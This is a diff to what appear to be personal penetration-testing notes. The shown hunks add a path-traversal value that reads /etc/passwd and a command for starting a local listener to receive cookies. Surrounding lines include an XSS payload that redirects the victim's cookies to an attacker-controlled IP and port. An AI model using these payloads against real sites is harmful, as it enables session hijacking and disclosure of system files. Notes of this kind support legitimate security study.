@@ -100,6 +100,8 @@ ssh -S /tmo/jump jump -O cancel -D9050
 - Set-Cookie 
 
 * ?var=hi -> Sends a GET request for specified variable to web server 
+  - ?home=../../../../../etc/passwd
+
 ```
 
 # Wget 
@@ -141,6 +143,8 @@ curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7'
 * changeText()
 
 * <script>document.location="http://10.50.X.X:8000/"+document.cookie;</script>
+  - python3 -m http.server
+    -> Opens a http port for the cookies to be sent to on your machine
 
 
 ```
